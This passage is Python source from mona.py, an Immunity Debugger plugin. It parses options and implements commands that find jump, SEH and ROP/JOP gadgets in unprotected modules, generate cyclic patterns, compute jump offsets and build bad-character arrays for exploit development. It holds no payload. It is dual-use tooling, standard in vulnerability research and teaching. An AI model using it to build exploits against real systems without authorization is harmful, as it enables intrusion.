			imm.log("    - Maximum nr of pointers to return : %d" % ptr_to_get)
	
	# only want to see specific type of pointers ?
	if "cp" in args:
		ptrcriteria = args["cp"].split(",")
		for ptrcrit in ptrcriteria:
			ptrcrit=ptrcrit.strip("'")
			ptrcrit=ptrcrit.strip('"').lower().strip()
			criteria[ptrcrit] = True
		imm.log("    - Pointer criteria : %s" % ptrcriteria)
	
	if "cpb" in args:
		badchars = args["cpb"]
		badchars = badchars.replace("'","")
		badchars = badchars.replace('"',"")
		badchars = badchars.replace("\\x","")
		cnt = 0
		strb = ""
		while cnt < len(badchars):
			strb=strb+binascii.a2b_hex(badchars[cnt]+badchars[cnt+1])
			cnt=cnt+2
		criteria["badchars"] = strb
		imm.log("    - Bad char filter will be applied to pointers : %s " % args["cpb"])
			
	if "cm" in args:
		modcriteria = args["cm"].split(",")
		for modcrit in modcriteria:
			modcrit=modcrit.strip("'")
			modcrit=modcrit.strip('"').lower().strip()
			#each criterium has 1 or 2 parts : criteria=value
			modcritparts = modcrit.split("=")
			try:
				if len(modcritparts) < 2:
					# set to True, no value given
					modulecriteria[modcritparts[0].strip()] = True
				else:
					# read the value
					modulecriteria[modcritparts[0].strip()] = (modcritparts[1].strip() == "true")
			except:
				continue
		if (inspect.stack()[1][3] == "procShowMODULES"):
			modcriteria = args["cm"].split(",")
			for modcrit in modcriteria:
				modcrit=modcrit.strip("'")
				modcrit=modcrit.strip('"').lower().strip()
				if modcrit.startswith("+"):
					modulecriteria[modcrit]=True
				else:
					modulecriteria[modcrit]=False
		imm.log("    - Module criteria : %s" % modcriteria)

	return modulecriteria,criteria			
				
	
#manage breakpoint on selected exported/imported functions from selected modules
def doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode="add",type="export"):	
	"""
	Sets a breakpoint on selected exported/imported functions from selected modules
	
	Arguments : 
	modulecriteria - Dictionary
	funcfilter - comma separated string indicating functions to set bp on
			must contains "*" to select all functions
	mode - "add" to create bp's, "del" to remove bp's
	
	Returns : nothing
	"""
	
	type = type.lower()
	
	namecrit = funcfilter.split(",")
	
	if mode == "add" or mode == "del":
		if not silent:
			imm.log("[+] Enumerating %sed functions" % type)
		modulestosearch = getModulesToQuery(modulecriteria)
		
		bpfuncs = {}
		
		for thismodule in modulestosearch:
			if not silent:
				imm.log(" Querying module %s" % thismodule)
			# get all
			themod = imm.getModule(thismodule)
			tmod = MnModule(thismodule)
			shortname = tmod.getShortName()
			syms = themod.getSymbols()
			# get funcs
			funcs = {}
			if type == "export":
				funcs = tmod.getEAT()
			else:
				funcs = tmod.getIAT()
			if not silent:
				imm.log("   Total nr of %sed functions : %d" % (type,len(funcs)))
			for func in funcs:
				if meetsCriteria(MnPointer(func), criteria):
					funcname = funcs[func].lower()
					setbp = False
					if "*" in namecrit:
						setbp = True
					else:
						for crit in namecrit:
							crit = crit.lower()
							tcrit = crit.replace("*","")
							if (crit.startswith("*") and crit.endswith("*")) or (crit.find("*") == -1):
								if funcname.find(tcrit) > -1:
									setbp = True
							elif crit.startswith("*"):
								if funcname.endswith(tcrit):
									setbp = True
							elif crit.endswith("*"):
								if funcname.startswith(tcrit):
									setbp = True
					
					if setbp:
						if type == "export":
							if not func in bpfuncs:
								bpfuncs[func] = funcs[func]
						else:
							ptr = 0
							try:
								#read pointer of imported function
								ptr=struct.unpack('<L',imm.readMemory(func,4))[0]
							except:
								pass
							if ptr > 0:
								if not ptr in bpfuncs:
									bpfuncs[ptr] = funcs[func]
		if not silent:
			imm.log("[+] Total nr of breakpoints to process : %d" % len(bpfuncs))
		if len(bpfuncs) > 0:
			for funcptr in bpfuncs:
				if mode == "add":
					imm.log("Set bp at 0x%s (%s in %s)" % (toHex(funcptr),bpfuncs[funcptr],MnPointer(funcptr).belongsTo()))
					try:
						imm.setBreakpoint(funcptr)
					except:
						imm.log("Failed setting bp at 0x%s" % toHex(funcptr))
				elif mode == "del":
					imm.log("Remove bp at 0x%s (%s in %s)" % (toHex(funcptr),bpfuncs[funcptr],MnPointer(funcptr).belongsTo()))
					try:
						imm.deleteBreakpoint(funcptr)
					except:
						imm.log("Skipped removal of bp at 0x%s" % toHex(funcptr))
						
	return

#-----------------------------------------------------------------------#
# main
#-----------------------------------------------------------------------#	
				
def main(args):
	imm.createLogWindow()
	try:
		starttime = datetime.datetime.now()
		ptr_counter = 0
		
		# initialize list of commands
		commands = {}
		
		# ----- HELP ----- #
		
		def procHelp(args):
			imm.log("     !mona - PyCommand for Immunity Debugger <= v1.8x")
			imm.log("     Current plugin version : %s " % (__VERSION__))
			imm.log("     Written by Corelan - https://www.corelan.be")
			imm.log("     Project page : https://redmine.corelan.be/projects/mona")
			imm.log("    |------------------------------------------------------------------|",highlight=1)
			imm.log("    |                         __               __                      |",highlight=1)
			imm.log("    |   _________  ________  / /___ _____     / /____  ____ _____ ___  |",highlight=1)
			imm.log("    |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |",highlight=1)
			imm.log("    | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |",highlight=1)
			imm.log("    | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |",highlight=1)
			imm.log("    |                                                                  |",highlight=1)
			imm.log("    |------------------------------------------------------------------|",highlight=1)
			imm.log("Global options :")
			imm.log("----------------")
			imm.log("You can use one or more of the following global options on any command that will perform")
			imm.log("a search in one or more modules, returning a list of pointers :")
			imm.log(" -n                     : Skip modules that start with a null byte. If this is too broad, use")
			imm.log("                          option -cm nonull instead")
			imm.log(" -o                     : Ignore OS modules")
			imm.log(" -p <nr>                : Stop search after <nr> pointers.")
			imm.log(" -m <module,module,...> : only query the given modules. Be sure what you are doing !")
			imm.log("                          You can specify multiple modules (comma separated)")
			imm.log("                          Tip : you can use -m *  to include all modules. All other module criteria will be ignored")
			imm.log("                          Other wildcards : *blah.dll = ends with blah.dll, blah* = starts with blah,")
			imm.log("                          blah or *blah* = contains blah")
			imm.log(" -cm <crit,crit,...>    : Apply some additional criteria to the modules to query.")
			imm.log("                          You can use one or more of the following criteria :")
			imm.log("                          aslr,safeseh,rebase,nx,os")
			imm.log("                          You can enable or disable a certain criterium by setting it to true or false")
			imm.log("                          Example :  -cm aslr=true,safeseh=false")
			imm.log("                          Suppose you want to search for p/p/r in aslr enabled modules, you could call")
			imm.log("                          !mona seh -cm aslr")
			imm.log(" -cp <crit,crit,...>    : Apply some criteria to the pointers to return")
			imm.log("                          Available options are :")
			imm.log("                          unicode,ascii,asciiprint,upper,lower,uppernum,lowernum,numeric,alphanum,nonull,startswithnull,unicoderev")
			imm.log("                          Note : Multiple criteria will be evaluated using 'AND', except if you are looking for unicode + one crit")
			imm.log(" -cpb '\\x00\\x01'        : Provide list with bad chars, applies to pointers")
			imm.log(" -x <access>            : Specify desired access level of the returning pointers. If not specified,")
			imm.log("                          only executable pointers will be return.  Access levels can be one of the following values : R,W,X,RW,RX,WX,RWX or *")
			
			if not args:
				args = []
			if len(args) > 1:
				thiscmd = args[1].lower().strip()
				if thiscmd in commands:
					imm.log("")
					imm.log("Usage of command '%s' :" % thiscmd)
					imm.log("%s" % ("-" * (22 + len(thiscmd))))
					imm.logLines(commands[thiscmd].usage)
					imm.log("")
				else:
					aliasfound = False
					for cmd in commands:
						if commands[cmd].alias == thiscmd:
							imm.log("")
							imm.log("Usage of command '%s' :" % thiscmd)
							imm.log("%s" % ("-" * (22 + len(thiscmd))))
							imm.logLines(commands[cmd].usage)
							imm.log("")
							aliasfound = True
					if not aliasfound:
						imm.logLines("\nCommand %s does not exist. Run !mona to get a list of available commands\n" % thiscmd,highlight=1)
			else:
				imm.logLines("\nUsage :")
				imm.logLines("-------\n")
				imm.log(" !mona <command> <parameter>")
				imm.logLines("\nAvailable commands and parameters :\n")

				items = commands.items()
				items.sort(key = itemgetter(0))
				for item in items:
					if commands[item[0]].usage <> "":
						aliastxt = ""
						if commands[item[0]].alias != "":
							aliastxt = " / " + commands[item[0]].alias
						imm.logLines("%s | %s" % (item[0] + aliastxt + (" " * (20 - len(item[0]+aliastxt))), commands[item[0]].description))
				imm.log("")
				imm.log("Want more info about a given command ?  Run !mona help <command>",highlight=1)
				imm.log("")
		
		commands["help"] = MnCommand("help", "show help", "!mona help [command]",procHelp)
		
		# ----- Config file management ----- #
		
		def procConfig(args):
			#did we specify -get, -set or -add?
			showerror = False
			if not "set" in args and not "get" in args and not "add" in args:
				showerror = True
				
			if "set" in args:
				if type(args["set"]).__name__.lower() == "bool":
					showerror = True
				else:
					#count nr of words
					params = args["set"].split(" ")
					if len(params) < 2:
						showerror = True
			if "add" in args:
				if type(args["add"]).__name__.lower() == "bool":
					showerror = True
				else:
					#count nr of words
					params = args["add"].split(" ")
					if len(params) < 2:
						showerror = True
			if "get" in args:
				if type(args["get"]).__name__.lower() == "bool":
					showerror = True
				else:
					#count nr of words
					params = args["get"].split(" ")
					if len(params) < 1:
						showerror = True
			if showerror:
				imm.log("Usage :")
				imm.logLines(configUsage,highlight=1)
				return
			else:
				if "get" in args:
					imm.log("Reading value from configuration file")
					monaConfig = MnConfig()
					thevalue = monaConfig.get(args["get"])
					imm.log("Parameter %s = %s" % (args["get"],thevalue))
				
				if "set" in args:
					imm.log("Writing value to configuration file")
					monaConfig = MnConfig()
					value = args["set"].split(" ")
					configparam = value[0].strip()
					imm.log("Old value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
					configvalue = args["set"][0+len(configparam):len(args["set"])]
					monaConfig.set(configparam,configvalue)
					imm.log("New value of parameter %s = %s" % (configparam,configvalue))
				
				if "add" in args:
					imm.log("Writing value to configuration file")
					monaConfig = MnConfig()
					value = args["add"].split(" ")
					configparam = value[0].strip()
					imm.log("Old value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
					configvalue = monaConfig.get(configparam).strip() + "," + args["add"][0+len(configparam):len(args["add"])].strip()
					monaConfig.set(configparam,configvalue)
					imm.log("New value of parameter %s = %s" % (configparam,configvalue))
				
		# ----- Jump to register ----- #
	
		def procFindJ(args):
			return procFindJMP(args)
		
		def procFindJMP(args):
			#default criteria
			modulecriteria={}
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False
			
			if (inspect.stack()[1][3] == "procFindJ"):
				imm.log(" ** Note : command 'j' has been replaced with 'jmp'. Now launching 'jmp' instead...",highlight=1)

			criteria={}
			all_opcodes={}
			
			global ptr_to_get
			ptr_to_get = -1
			
			distancestr = ""
			mindistance = 0
			maxdistance = 0
			
			#did user specify -r <reg> ?
			showerror = False
			if "r" in args:
				if type(args["r"]).__name__.lower() == "bool":
					showerror = True
				else:
					#valid register ?
					thisreg = args["r"].upper().strip()
					validregs = immlib.Registers32BitsOrder
					if not thisreg in validregs:
						showerror = True
			else:
				showerror = True
				
			if "distance" in args:
				if type(args["distance"]).__name__.lower() == "bool":
					showerror = True
				else:
					distancestr = args["distance"]
					distanceparts = distancestr.split(",")
					for parts in distanceparts:
						valueparts = parts.split("=")
						if len(valueparts) > 1:
							if valueparts[0].lower() == "min":
								try:
									mindistance = int(valueparts[1])
								except:
									mindistance = 0		
							if valueparts[0].lower() == "max":
								try:
									maxdistance = int(valueparts[1])
								except:
									maxdistance = 0						
			
			if maxdistance < mindistance:
				tmp = maxdistance
				maxdistance = mindistance
				mindistance = tmp
			
			criteria["mindistance"] = mindistance
			criteria["maxdistance"] = maxdistance
			
			
			if showerror:
				imm.log("Usage :")
				imm.logLines(jmpUsage,highlight=1)
				return				
			else:
				modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
				# go for it !	
				all_opcodes=findJMP(modulecriteria,criteria,args["r"].lower().strip())
			
			# write to log
			logfile = MnLog("jmp.txt")
			thislog = logfile.reset()
			processResults(all_opcodes,logfile,thislog)
		
		# ----- Exception Handler Overwrites ----- #
		
					
		def procFindSEH(args):
			#default criteria
			modulecriteria={}
			modulecriteria["safeseh"] = False
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False

			criteria={}
			all_opcodes = {}
			
			global ptr_to_get
			ptr_to_get = -1
			
			#what is the caller function (backwards compatibility with pvefindaddr)
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)

			if "rop" in args:
				criteria["rop"] = True
			
			if "all" in args:
				criteria["all"] = True
			else:
				criteria["all"] = False
			
			# go for it !	
			all_opcodes = findSEH(modulecriteria,criteria)
			#report findings to log
			logfile = MnLog("seh.txt")
			thislog = logfile.reset()
			processResults(all_opcodes,logfile,thislog)
			
			
			

		# ----- MODULES ------ #
		def procShowMODULES(args):
			modulecriteria={}
			criteria={}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			modulestosearch = getModulesToQuery(modulecriteria)
			showModuleTable("",modulestosearch)

		# ----- ROP ----- #
		def procFindROPFUNC(args):
			#default criteria
			modulecriteria={}
			modulecriteria["aslr"] = False
			#modulecriteria["rebase"] = False
			modulecriteria["os"] = False
			criteria={}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			ropfuncs = {}
			ropfuncoffsets ={}
			ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria,criteria)
			#report findings to log
			imm.log("[+] Processing pointers to interesting rop functions")
			logfile = MnLog("ropfunc.txt")
			thislog = logfile.reset()
			processResults(ropfuncs,logfile,thislog)
			global silent
			silent = True
			imm.log("[+] Processing offsets to pointers to interesting rop functions")
			logfile = MnLog("ropfunc_offset.txt")
			thislog = logfile.reset()
			processResults(ropfuncoffsets,logfile,thislog)			
			
		def procStackPivots(args):
			procROP(args,"stackpivot")
			
		def procROP(args,mode="all"):
			#default criteria
			modulecriteria={}
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False
			modulecriteria["os"] = False

			criteria={}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			
			# handle optional arguments
			
			depth = 6
			maxoffset = 40
			thedistance = 8
			split = False
			fast = False
			endingstr = ""
			endings = []
			
			if "depth" in args:
				if type(args["depth"]).__name__.lower() != "bool":
					try:
						depth = int(args["depth"])
					except:
						pass
			
			if "offset" in args:
				if type(args["offset"]).__name__.lower() != "bool":
					try:
						maxoffset = int(args["offset"])
					except:
						pass
			
			if "distance" in args:
				if type(args["distance"]).__name__.lower() != "bool":
					try:
						thedistance = args["distance"]
					except:
						pass
			
			if "split" in args:
				if type(args["split"]).__name__.lower() == "bool":
					split = args["split"]
					
			if "fast" in args:
				if type(args["fast"]).__name__.lower() == "bool":
					fast = args["fast"]
			
			if "end" in args:
				if type(args["end"]).__name__.lower() == "str":
					endingstr = args["end"].replace("'","").replace('"',"").strip()
					endings = endingstr.split("#")
					
			if "f" in args:
				if args["f"] <> "":
					criteria["f"] = args["f"]
			
			
			if "rva" in args:
				criteria["rva"] = True
			
			if mode == "stackpivot":
				fast = False
				endings = ""
				split = False
			else:
				mode = "all"
			
			findROPGADGETS(modulecriteria,criteria,endings,maxoffset,depth,split,thedistance,fast,mode)
			
			
			
		def procJOP(args,mode="all"):
			#default criteria
			modulecriteria={}
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False
			modulecriteria["os"] = False

			criteria={}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			
			# handle optional arguments
			
			depth = 6
			
			if "depth" in args:
				if type(args["depth"]).__name__.lower() != "bool":
					try:
						depth = int(args["depth"])
					except:
						pass			
			findJOPGADGETS(modulecriteria,criteria,depth)			
			
			
		def procCreatePATTERN(args):
			size = 0
			pattern = ""
			if "?" in args and args["?"] != "":
				try:
					size = int(args["?"])
				except:
					size = 0
			if size == 0:
				imm.log("Please enter a valid size",highlight=1)
			else:
				pattern = createPattern(size,args)
				imm.log("Creating cyclic pattern of %d bytes" % size)				
				imm.log(pattern)
				global ignoremodules
				ignoremodules = True
				objpatternfile = MnLog("pattern.txt")
				patternfile = objpatternfile.reset()
				objpatternfile.write("Pattern of " + str(size) + " bytes :",patternfile)
				objpatternfile.write("-" * (19 + len(str(size))),patternfile)
				objpatternfile.write(pattern,patternfile)
				if not silent:
					imm.log("Note: don't copy this pattern from the log window, it might be truncated !",highlight=1)
					imm.log("It's better to open %s and copy the pattern from the file" % patternfile,highlight=1)
				
				ignoremodules = False
			return


		def procOffsetPATTERN(args):
			egg = ""
			if "?" in args and args["?"] != "":
				try:
					egg = args["?"]
				except:
					egg = ""
			if egg == "":
				imm.log("Please enter a valid target",highlight=1)
			else:
				findOffsetInPattern(egg,-1,args)
			return
		
		# ----- Comparing file output ----- #
		def procFileCOMPARE(args):
			modulecriteria={}
			criteria={}
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			allfiles=[]
			tomatch=""
			checkstrict=True
			rangeval = 0
			if "f" in args:
				if args["f"] <> "":
					rawfilenames=args["f"].replace('"',"")
					allfiles = rawfilenames.split(',')
					imm.log("[+] Number of files to be examined : %d : " % len(allfiles))
			if "range" in args:
				if not type(args["range"]).__name__.lower() == "bool":
					strrange = args["range"].lower()
					if strrange.startswith("0x") and len(strrange) > 2 :
						rangeval = int(strrange,16)
					else:
						try:
							rangeval = int(args["range"])
						except:
							rangeval = 0
					if rangeval > 0:
						imm.log("[+] Find overlap using pointer + range, value %d" % rangeval)
				else:
					imm.log("Please provide a numeric value ^(> 0) with option -range",highlight=1)
					return
			else:
				if "contains" in args:
					if type(args["contains"]).__name__.lower() == "str":
						tomatch = args["contains"].replace("'","").replace('"',"")
				if "nostrict" in args:
					if type(args["nostrict"]).__name__.lower() == "bool":
						checkstrict = not args["nostrict"]
						imm.log("[+] Instructions must match in all files ? %s" % checkstrict)
			if len(allfiles) > 1:
				findFILECOMPARISON(modulecriteria,criteria,allfiles,tomatch,checkstrict,rangeval)
			else:
				imm.log("Please specify at least 2 filenames to compare",highlight=1)

		# ----- Find bytes in memory ----- #
		def procFind(args):
			modulecriteria={}
			criteria={}
			pattern = ""
			base = 0
			offset = 0
			top  = TOP_USERLAND
			consecutive = False
			type = ""
			
			level = 0
			offsetlevel = 0			
			
			if not "a" in args:
				args["a"] = "*"
			
			#search for all pointers by default
			if not "x" in args:
				args["x"] = "*"
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			if criteria["accesslevel"] == "":
				return
			if not "s" in args:
				imm.log("-s <search pattern (or filename)> is a mandatory argument",highlight=1)
				return
			pattern = args["s"]
			
			if "unicode" in args:
				criteria["unic"] = True

			if "b" in args:
				try:
					base = int(args["b"],16)
				except:
					imm.log("invalid base address: %s" % args["b"],highlight=1)
					return
			if "t" in args:
				try:
					top = int(args["t"],16)
				except:
					imm.log("invalid top address: %s" % args["t"],highlight=1)
					return
			if "offset" in args:
				try:
					offset = 0 - int(args["offset"])
				except:
					imm.log("invalid offset value",highlight=1)
					return	
					
			if "level" in args:
				try:
					level = int(args["level"])
				except:
					imm.log("invalid level value",highlight=1)
					return

			if "offsetlevel" in args:
				try:
					offsetlevel = int(args["offsetlevel"])
				except:
					imm.log("invalid offsetlevel value",highlight=1)
					return						
					
			if "c" in args:
				imm.log("    - Skipping consecutive pointers, showing size instead")			
				consecutive = True
				
			if "type" in args:
				if not args["type"] in ["bin","asc","ptr","instr","file"]:
					imm.log("Invalid search type : %s" % args["type"], highlight=1)
					return
				type = args["type"] 
				if type == "file":
					filename = args["s"].replace('"',"").replace("'","")
					#see if we can read the file
					if not os.path.isfile(filename):
						imm.log("Unable to find/read file %s" % filename,highlight=1)
						return
			rangep2p = 0

			
			if "p2p" in args or level > 0:
				imm.log("    - Looking for pointers to pointers")
				criteria["p2p"] = True
				if "r" in args:	
					try:
						rangep2p = int(args["r"])
					except:
						pass
					if rangep2p > 0:
						imm.log("    - Will search for close pointers (%d bytes backwards)" % rangep2p)
				if "p2p" in args:
					level = 1
			
			
			if level > 0:
				imm.log("    - Recursive levels : %d" % level)
						
			allpointers = findPattern(modulecriteria,criteria,pattern,type,base,top,consecutive,rangep2p,level,offset,offsetlevel)
				
			logfile = MnLog("find.txt")
			thislog = logfile.reset()
			processResults(allpointers,logfile,thislog)
			return
			
			
		# ---- Find instructions, wildcard search ----- #
		def procFindWild(args):
			modulecriteria={}
			criteria={}
			pattern = ""
			base = 0
			top  = TOP_USERLAND
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)

			if not "s" in args:
				imm.log("-s <search pattern (or filename)> is a mandatory argument",highlight=1)
				return
			pattern = args["s"]
			
			
			if "b" in args:
				try:
					base = int(args["b"],16)
				except:
					imm.log("invalid base address: %s" % args["b"],highlight=1)
					return
			if "t" in args:
				try:
					top = int(args["t"],16)
				except:
					imm.log("invalid top address: %s" % args["t"],highlight=1)
					return
					
			if "depth" in args:
				try:
					criteria["depth"] = int(args["depth"])
				except:
					imm.log("invalid depth value",highlight=1)
					return	

			if "all" in args:
				criteria["all"] = True
				
			if "distance" in args:
				if type(args["distance"]).__name__.lower() == "bool":
					imm.log("invalid distance value(s)",highlight=1)
				else:
					distancestr = args["distance"]
					distanceparts = distancestr.split(",")
					for parts in distanceparts:
						valueparts = parts.split("=")
						if len(valueparts) > 1:
							if valueparts[0].lower() == "min":
								try:
									mindistance = int(valueparts[1])
								except:
									mindistance = 0	
							if valueparts[0].lower() == "max":
								try:
									maxdistance = int(valueparts[1])
								except:
									maxdistance = 0	
			
				if maxdistance < mindistance:
					tmp = maxdistance
					maxdistance = mindistance
					mindistance = tmp
				
				criteria["mindistance"] = mindistance
				criteria["maxdistance"] = maxdistance
						
			allpointers = findPatternWild(modulecriteria,criteria,pattern,base,top)
				
			logfile = MnLog("findwild.txt")
			thislog = logfile.reset()
			processResults(allpointers,logfile,thislog)		
			return
	
			
		# ----- assemble: assemble instructions to opcodes ----- #
		def procAssemble(args):
			opcodes = ""
			encoder = ""
			
			if not 's' in args:
				imm.log("Mandatory argument -s <opcodes> missing", highlight=1)
				return
			opcodes = args['s']
			
			if 'e' in args:
				# TODO: implement encoder support
				imm.log("Encoder support not yet implemented", highlight=1)
				return
				encoder = args['e'].lowercase()
				if encoder not in ["ascii"]:
					imm.log("Invalid encoder : %s" % encoder, highlight=1)
					return
			
			assemble(opcodes,encoder)
			
		# ----- info: show information about an address ----- #
		def procInfo(args):
			
			if not "a" in args:
				imm.log("Missing mandatory argument -a", highlight=1)
				return
			
			args["a"] = args["a"].replace("0x","").replace("0X","")
			
			if not isAddress(args["a"]):
				imm.log("%s is not a valid address" % args["a"], highlight=1)
				return
			
			address = addrToInt(args["a"])
			ptr = MnPointer(address)
			modname = ptr.belongsTo()
			modinfo = None
			if modname != "":
				modinfo = MnModule(modname)
			rebase = ""
			rva=0
			if modinfo :
				rva = address - modinfo.moduleBase
			imm.log("")
			imm.log("Information about address 0x%s" % toHex(address))
			imm.log("    %s" % ptr.__str__())
			if rva != 0:
				imm.log("    Offset from module base: 0x%x" % rva)
			if ptr.isOnStack():
				imm.log("    This address is in a stack segment")
			if modinfo:
				imm.log("    Module: %s" % modinfo.__str__())
			else:
				imm.log("    Module: None")
			try:
				op = imm.disasm(address)
				opstring=op.getDisasm()
				imm.log("    Instruction at %s : %s" % (toHex(address),opstring))
			except:
				pass
			
			imm.log("")
		
		# ----- dump: Dump some memory to a file ----- #
		def procDump(args):
			
			filename = ""
			if "f" not in args:
				imm.log("Missing mandatory argument -f <filename>", highlight=1)
				return
			filename = args["f"]
			
			address = None
			if "s" not in args:
				imm.log("Missing mandatory argument -s <address>", highlight=1)
			
			if not isAddress(args["s"]):
				imm.log("%s is an invalid address" % args["s"], highlight=1)
				return
			address = addrToInt(args["s"])
			
			size = 0
			if "n" in args:
				size = int(args["n"])
			elif "e" in args:
				if not isAddress(args["e"]):
					imm.log("%s is an invalid address" % args["e"], highlight=1)
					return
				end = addrToInt(args["e"])
				if end < address:
					imm.log("end address %s is before start address %s" % (args["e"],args["s"]), highlight=1)
					return
				size = end - address
			else:
				imm.log("you need to specify either the size of the copy with -n or the end address with -e ", highlight=1)
				return
			
			dumpMemoryToFile(address,size,filename)
			
		# ----- compare : Compare contents of a file with copy in memory, indicate bad chars / corruption ----- #
		def procCompare(args):
			startpos = 0
			filename = ""
			if "f" in args:
				filename = args["f"].replace('"',"").replace("'","")
				#see if we can read the file
				if not os.path.isfile(filename):
					imm.log("Unable to find/read file %s" % filename,highlight=1)
					return
			else:
				imm.log("You must specify a valid filename using parameter -f", highlight=1)
				return
			if "a" in args:
				if not isAddress(args["a"]):
					imm.log("%s is an invalid address" % args["a"], highlight=1)
					return
				else:
					startpos = args["a"]
			compareFileWithMemory(filename,startpos)
			
			
# ----- offset: Calculate the offset between two addresses ----- #
		def procOffset(args):
			extratext1 = ""
			extratext2 = ""
			isReg_a1 = False
			isReg_a2 = False
			regs = imm.getRegs()
			if "a1" not in args:
				imm.log("Missing mandatory argument -a1 <address>", highlight=1)
				return
			a1 = args["a1"]
			if "a2" not in args:
				imm.log("Missing mandatory argument -a2 <address>", highlight=1)
				return		
			a2 = args["a2"]
			
			for reg in regs:
				if reg.upper() == a1.upper():
					a1=toHex(regs[reg])					
					isReg_a1 = True
					extratext1 = " [" + reg.upper() + "] " 
					break
			a1 = a1.upper().replace("0X","").lower()
				
			if not isAddress(str(a1)):
				imm.log("%s is not a valid address" % str(a1), highlight=1)
				return


			for reg in regs:
				if reg.upper() == a2.upper():
					a2=toHex(regs[reg])					
					isReg_a2 = True
					extratext2 = " [" + reg.upper() + "] " 					
					break
			a2 = a2.upper().replace("0X","").lower()
			
			if not isAddress(str(a2)):
				imm.log("%s is not a valid address" % str(a2), highlight=1)
				return
				
			a1 = hexStrToInt(a1)
			a2 = hexStrToInt(a2)
			
			diff = a2 - a1
			result=toHex(diff)
			negjmpbytes = ""
			if a1 > a2:
				ndiff = a1 - a2
				result=toHex(4294967296-ndiff) 
				negjmpbytes="\\x"+ result[6]+result[7]+"\\x"+result[4]+result[5]+"\\x"+result[2]+result[3]+"\\x"+result[0]+result[1]
				regaction="sub"
			imm.log("Offset from 0x%08x%s to 0x%08x%s : %d (0x%s) bytes" % (a1,extratext1,a2,extratext2,diff,result))	
			if a1 > a2:
				imm.log("Negative jmp offset : %s" % negjmpbytes)
			else:
				imm.log("Jmp offset : %s" % negjmpbytes)				
				
		# ----- bp: Set a breakpoint on read/write/exe access ----- #
		def procBp(args):
			isReg_a = False
			regs = imm.getRegs()
			thistype = ""
			
			if "a" not in args:
				imm.log("Missing mandatory argument -a <address>", highlight=1)
				return
			a = str(args["a"])

			for reg in regs:
				if reg.upper() == a.upper():
					a=toHex(regs[reg])					
					isReg_a = True
					break
			a = a.upper().replace("0X","").lower()
			
			if not isAddress(str(a)):
				imm.log("%s is not a valid address" % a, highlight=1)
				return
			
			if "t" not in args:
				imm.log("Missing mandatory argument -t <type>", highlight=1)
				return
			else:
				thistype = args["t"].upper()
				
			valid_types = ["READ", "WRITE", "SFX", "EXEC"]
			
			if not thistype in valid_types:
				imm.log("Invalid type : %s" % thistype)
				return
			
			if thistype == "EXEC":
				thistype = "SFX"
			
			a = hexStrToInt(a)
			
			imm.setMemBreakpoint(a,thistype[0])
			imm.log("Breakpoint set on %s of 0x%s" % (thistype,toHex(a)),highlight=1)
			
		# ----- bf: Set a breakpoint on exported functions of a module ----- #
		def procBf(args):

			funcfilter = ""
			
			mode = ""
			
			type = "export"
			
			modes = ["add","del","list"]
			types = ["import","export","iat","eat"]
			
			modulecriteria={}
			criteria={}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
		
			if "s" in args:
				try:
					funcfilter = args["s"].lower()
				except:
					imm.log("No functions selected. (-s)",highlight=1)
					return
			else:
				imm.log("No functions selected. (-s)",highlight=1)
				return
					
			if "t" in args:
				try:
					mode = args["t"].lower()
				except:
					pass

			if "f" in args:
				try:
					type = args["f"].lower()
				except:
					pass

			if not type in types:
				imm.log("No valid function type selected (-f <import|export>)",highlight=1)
				return

			if not mode in modes or mode=="":
				imm.log("No valid action defined. (-t <add|del>)")

			doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode,type)
			
			return
		
		
		# ----- Show info about modules -------#
		def procModInfoS(args):
			modulecriteria = {}
			criteria = {}
			modulecriteria["safeseh"] = False
			imm.log("Safeseh unprotected modules :")
			modulestosearch = getModulesToQuery(modulecriteria)
			showModuleTable("",modulestosearch)
			return
			
		def procModInfoSA(args):
			modulecriteria = {}
			criteria = {}
			modulecriteria["safeseh"] = False
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False	
			imm.log("Safeseh unprotected, no aslr & no rebase modules :")
			modulestosearch = getModulesToQuery(modulecriteria)
			showModuleTable("",modulestosearch)			
			return

		def procModInfoA(args):
			modulecriteria = {}
			criteria = {}
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False	
			imm.log("No aslr & no rebase modules :")			
			modulestosearch = getModulesToQuery(modulecriteria)
			showModuleTable("",modulestosearch)			
			return
			
		# ----- Print byte array ----- #
		
		def procByteArray(args):
			badchars = ""
			forward = True
			startval = 0
			endval = 255
			sign = 1
			bytesperline = 32
			if "b" in args:
				if type(args["b"]).__name__.lower() != "bool":	
					badchars = args["b"]
			if "r" in args:
				forward = False
				startval = -255
				endval = 0
				sign = -1
				
			badchars = badchars.replace("'","")
			badchars = badchars.replace('"',"")
			badchars = badchars.replace("\\x","")
			cnt = 0
			strb = ""
			while cnt < len(badchars):
				strb=strb+binascii.a2b_hex(badchars[cnt]+badchars[cnt+1])
				cnt=cnt+2			
			
			imm.log("Generating table, excluding %d bad chars..." % len(strb))
			arraytable = []
			binarray = ""
			while startval <= endval:
				thisval = startval * sign
				hexbyte = hex(thisval)[2:]
				binbyte = hex2bin(toHexByte(thisval))
				if len(hexbyte) == 1:
					hexbyte = "0" + hexbyte
				hexbyte2 = binascii.a2b_hex(hexbyte)
				if not hexbyte2 in strb:
